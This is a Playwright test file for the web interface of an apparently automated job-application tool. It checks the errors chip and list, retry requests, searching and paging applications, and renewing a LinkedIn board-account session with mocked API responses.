  await expect(page.getByRole("table", { name: "Applied applications" })).toContainText("Aurora Systems");
  const applied = page.getByRole("button", { name: "applied, 1 applications" });
  await applied.click();
  await expect(applied).toHaveAttribute("aria-pressed", "false");
  await expect(page.getByRole("heading", { name: "Applied", level: 1 })).toHaveCount(0);

  // A row opens its application.
  await page.getByRole("button", { name: "lead, 2 applications" }).click();
  await page.getByRole("table", { name: "Lead applications" }).getByRole("button", { name: "Example Co · Senior Engineer" }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeVisible();
});

test("the errors chip sits between ready and applied and lists what is stuck, and why", async ({ page }, testInfo) => {
  // A failed run used to drop its application back into Ready, where it looked like a
  // packet nobody had tried (#284).
  const readyApps = [
    { ...application, status: "ready" },
    { ...applications[1], status: "ready" },
    applications[2],
  ];
  const stuck = {
    name: application.filename, company: application.company, role: application.role,
    link: "https://careers.example.com/jobs/1", provider: "unknown",
    error: "no application form was found on the page — nothing to fill (the Apply button did not respond within 5 s)",
    at: "2026-09-20T07:05:03Z", runs: 4, captcha: false,
    next: "you", retry_at: null, why: "gave up after 3 failed runs in 7 days",
  };
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    const method = route.request().method();
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps" && method === "GET") body = readyApps;
    else if (path === "/api/stats") body = { status: { ready: 2, applied: 1 }, lane: {}, errors: 1 };
    else if (path === "/api/errors") body = { count: 1, retrying: 0, needs_you: 1, errors: [stuck] };
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true, dry_run: false };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path.endsWith("/submit") && method === "POST") body = { queued: true, dry_run: true };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");

  // The errored one is an error, not a Ready packet: the two chips never count it twice.
  const strip = page.locator(".pipe-stat");
  await expect(strip).toHaveText([/1\s*ready/, /1\s*error$/, /1\s*applied/]);

  await page.getByRole("button", { name: "1 application with errors" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Errors" })).toBeVisible();
  const row = page.getByRole("row").filter({ hasText: application.company });
  await expect(row).toContainText("the Apply button did not respond within 5 s");
  await expect(row).toContainText("Needs you");
  await expect(row).toContainText("gave up after 3 failed runs in 7 days");
  await expectNoSeriousViolations(page);

  const sent = page.waitForRequest((request) =>
    new URL(request.url()).pathname.endsWith("/submit") && request.method() === "POST");
  await row.getByRole("button", { name: /^Retry / }).click();
  expect((await sent).postDataJSON()).toEqual({ dry_run: true });

  // Ready lists only what is still to try.
  await page.getByRole("button", { name: "ready, 1 applications" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Ready" })).toBeVisible();
  await expect(page.locator("#content")).toContainText("1 application.");
  await expect(page.locator("#content")).not.toContainText(application.company);

  // But a search finds it from anywhere, and says it is stuck (#322): "which page is DTCC on?"
  // (On a phone the list is its own pane, reached by the Applications button.)
  if (testInfo.project.name === "mobile") await page.getByRole("button", { name: "Applications", exact: true }).click();
  await page.getByLabel("Search applications").fill(application.company.split(" ")[0]);
  const card = page.locator("#application-list .application-card").filter({ hasText: application.company });
  await expect(card).toBeVisible();
  await expect(card).toContainText("In Errors");
  await expect(page.locator("#app-count")).toHaveText(/^1 match in all 3 applications$/);
  // A search is not a Ready selection: no bulk checkboxes over a list of every status.
  await expect(page.locator("#bulk-bar")).toBeHidden();
  await expectNoSeriousViolations(page);
});

test("a search lists every match with its number, where it is, and its posting, filtered and paged", async ({ page }, testInfo) => {
  // "Which page is DTCC on?" (#326): the answer is a number to search for and a table that
  // says where each match is — Errors included — with links to it and to the posting.
  const many = Array.from({ length: 23 }, (_, i) => ({
    ...applications[1], id: 100 + i, filename: `acme-${i}.md`, company: `Acme ${i}`, role: "Engineer",
    status: i % 2 ? "lead" : "ready", link: `https://jobs.example.com/${i}`,
  }));
  const dtcc = { ...application, id: 15339, filename: "dtcc-senior.md", company: "The Depository Trust & Clearing Corporation (DTCC)",
    role: "Senior Software Engineer", status: "ready", link: "https://ebxr.fa.us2.oraclecloud.com/job/212747" };
  const stuck = { name: dtcc.filename, company: dtcc.company, role: dtcc.role, link: dtcc.link, provider: "unknown",
    error: "the sign-in code was taken but no application form followed", at: "2026-09-24T07:26:06Z", runs: 3,
    captcha: false, next: "you", retry_at: null, why: "the same thing will happen on another run — it needs you, or a fix" };
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps") body = [dtcc, ...many];
    else if (path === "/api/stats") body = { status: { ready: 12, lead: 11 }, lane: {}, errors: 1 };
    else if (path === "/api/errors") body = { count: 1, retrying: 0, needs_you: 1, errors: [stuck] };
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true, dry_run: false };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path === `/api/apps/${dtcc.filename}`) body = { ...detail, filename: dtcc.filename, fields: { ...detail.fields, company: dtcc.company, status: "ready" } };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");

  // By its number: the one result, where it is, and both links.
  const box = page.getByLabel("Search applications");
  await box.fill("#15339");
  await box.press("Enter");
  await expect(page.getByRole("heading", { level: 1, name: "Results for “#15339”" })).toBeVisible();
  const row = page.getByRole("row").filter({ hasText: "DTCC" });
  await expect(row).toContainText("#15339");
  await expect(row.getByRole("button", { name: "Errors" })).toBeVisible();
  await expect(row.getByRole("link", { name: /Posting ↗/ })).toHaveAttribute("href", dtcc.link);
  await expect(row.getByRole("link", { name: /^The Depository/ })).toHaveAttribute("href", "#app=dtcc-senior.md");
  await expectNoSeriousViolations(page);

  // Twenty to a page, and the filters narrow it. (On a phone the results replace the list;
  // the Applications button brings the search box back.)
  const backToList = async () => {
    if (testInfo.project.name === "mobile") await page.getByRole("button", { name: "Applications", exact: true }).click();
  };
  await backToList();
  await box.fill("acme");
  await box.press("Enter");
  await expect(page.locator("#content")).toContainText("1–20 of 23 matches");
  await page.getByRole("button", { name: "Next" }).click();
  await expect(page.locator("#content")).toContainText("21–23 of 23 matches");
  await page.getByLabel("Where").selectOption("lead");
  await expect(page.locator("#content")).toContainText("1–11 of 11 matches (23 before filtering)");

  // "Where it is" goes there.
  await backToList();
  await box.fill("15339");
  await box.press("Enter");
  await page.getByRole("row").filter({ hasText: "DTCC" }).getByRole("button", { name: "Errors" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Errors" })).toBeVisible();
  await expect(page.getByRole("row").filter({ hasText: "DTCC" })).toContainText("#15339");
});

test("a signed-in source's board account shows its session and offers Sign in now", async ({ page }) => {
  // The agent renews a kept session on its own six-hour clock, and LinkedIn's app tap has to
  // come within minutes of it; Sign in now lets the person pick the moment. An account that
  // keeps no session (SuccessFactors) gets no such button.
  const accounts = [
    { host: "career4.successfactors.com", username: "person@example.com", has_password: true, updated_at: "2026-09-14T06:18:51Z",
      keeps_session: false, session_expires_at: null, renew_requested_at: null },
    { host: "linkedin.com", username: "person@example.com", has_password: true, updated_at: "2026-09-21T22:16:21Z",
      keeps_session: true, session_expires_at: null, renew_requested_at: null },
  ];
  let renewed = 0;
  await page.route("**/api/board-accounts**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    let body = accounts;
    if (route.request().method() === "POST" && path === "/api/board-accounts/linkedin.com/renew") {
      renewed += 1;
      accounts[1].renew_requested_at = "2026-09-22T17:30:00Z";
    }
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Agent", exact: true }).click();
  const list = page.locator("#board-accounts");
  await expect(list).toContainText("no session kept");
  await expect(list.getByRole("button", { name: "Sign in to linkedin.com now" })).toBeVisible();
  await expect(list.getByRole("button", { name: /Sign in to career4/ })).toHaveCount(0);
  await expectNoSeriousViolations(page);

  await list.getByRole("button", { name: "Sign in to linkedin.com now" }).click();
  await expect(list).toContainText("sign-in requested, the agent is on it");
  await expect(list.getByRole("button", { name: "Sign in to linkedin.com now" })).toBeDisabled();
  expect(renewed).toBe(1);
});
